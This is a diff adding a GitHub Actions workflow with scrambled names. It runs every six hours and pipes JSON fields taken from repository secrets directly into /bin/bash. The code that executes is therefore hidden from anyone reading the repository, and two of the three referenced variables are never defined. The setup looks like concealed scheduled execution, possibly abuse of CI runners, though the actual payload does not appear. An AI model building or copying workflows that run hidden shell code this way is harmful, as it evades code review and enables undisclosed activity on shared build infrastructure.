@@ -1,0 +1,21 @@
+name: bingqilinnaniyou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: bingqilinnaniyou
+        env:
+          ew66155: ${{ secrets.ew66155 }}
+        run: |
+          echo $ew66155 | jq -r .p949 | /bin/bash
+          echo $owva41 | jq -r .rpq2869 | /bin/bash
+          echo $huu23241 | jq -r .x262 | /bin/bash
+
